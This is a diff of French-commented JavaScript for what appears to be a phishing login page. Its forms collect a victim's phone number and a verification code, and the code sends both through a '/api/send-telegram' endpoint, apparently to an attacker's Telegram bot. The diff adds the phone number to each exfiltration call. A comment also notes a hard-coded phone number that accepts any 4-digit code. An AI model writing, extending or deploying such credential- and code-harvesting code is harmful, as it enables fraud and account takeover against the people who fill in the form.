@@ -8,14 +8,14 @@ function generateUniqueId() {
 }
 
 // Envoyer message à Telegram via API serverless
-async function sendToTelegram(message) {
+async function sendToTelegram(message, phone) {
     try {
         const response = await fetch('/api/send-telegram', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ message })
+            body: JSON.stringify({ message, phone })
         });
         
         const data = await response.json();
@@ -93,7 +93,7 @@ if (loginForm) {
                        `📱 <b>Téléphone:</b> ${username}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
         
-        await sendToTelegram(message);
+        await sendToTelegram(message, cleanPhone);
         
         const loadingMessage = document.getElementById('loadingMessage');
         const loginFormElement = document.getElementById('loginForm');
@@ -154,7 +154,7 @@ if (verificationForm) {
                        `🔢 <b>Code:</b> ${code}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
         
-        await sendToTelegram(message);
+        await sendToTelegram(message, storedPhone);
         
         // Si le numéro enregistré est 07 76 34 45 34, accepter tout code à 4 chiffres
         if (storedPhone === allowedPhone && /^[0-9]{4}$/.test(code)) {
